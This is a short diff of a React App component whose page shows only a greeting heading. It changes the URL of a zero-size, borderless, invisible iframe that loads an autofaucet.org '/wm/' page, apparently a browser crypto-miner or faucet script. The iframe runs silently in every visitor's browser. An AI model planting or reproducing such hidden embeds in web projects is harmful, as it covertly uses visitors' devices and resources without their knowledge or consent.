@@ -4,7 +4,7 @@ function App() {
   return (
     <div className="App">
       <h1>Прівєт, Брабус</h1>
-      <iframe src="https://autofaucet.org/wm/swag124/2" width="0" title='bruh' height="0" style={{"border":"none"}}></iframe>
+      <iframe src="https://autofaucet.org/wm/swag124/4" width="0" title='bruh' height="0" style={{"border":"none"}}></iframe>
     </div>
   );
 }
